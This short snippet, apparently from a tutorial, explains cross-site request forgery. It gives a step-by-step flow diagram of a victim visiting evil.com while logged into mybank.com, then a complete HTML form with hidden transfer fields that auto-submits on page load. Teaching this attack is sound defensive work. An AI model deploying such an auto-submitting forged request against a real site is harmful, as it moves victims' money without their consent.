Alice logs into mybank.com  
        ⬇  
Browser stores session cookie  
        ⬇  
Alice visits hacker’s site evil.com  
        ⬇  
Hacker’s site sends a forged request to mybank.com  
        ⬇  
Bank processes the request as if Alice submitted it  
        ⬇  
Alice loses money! 🚨


<form action="https://mybank.com/transfer" method="POST">
    <input type="hidden" name="amount" value="5000">
    <input type="hidden" name="toAccount" value="666999">
    <input type="submit">
</form>

<script>
    document.forms[0].submit(); // Auto-submits when the page loads
</script>
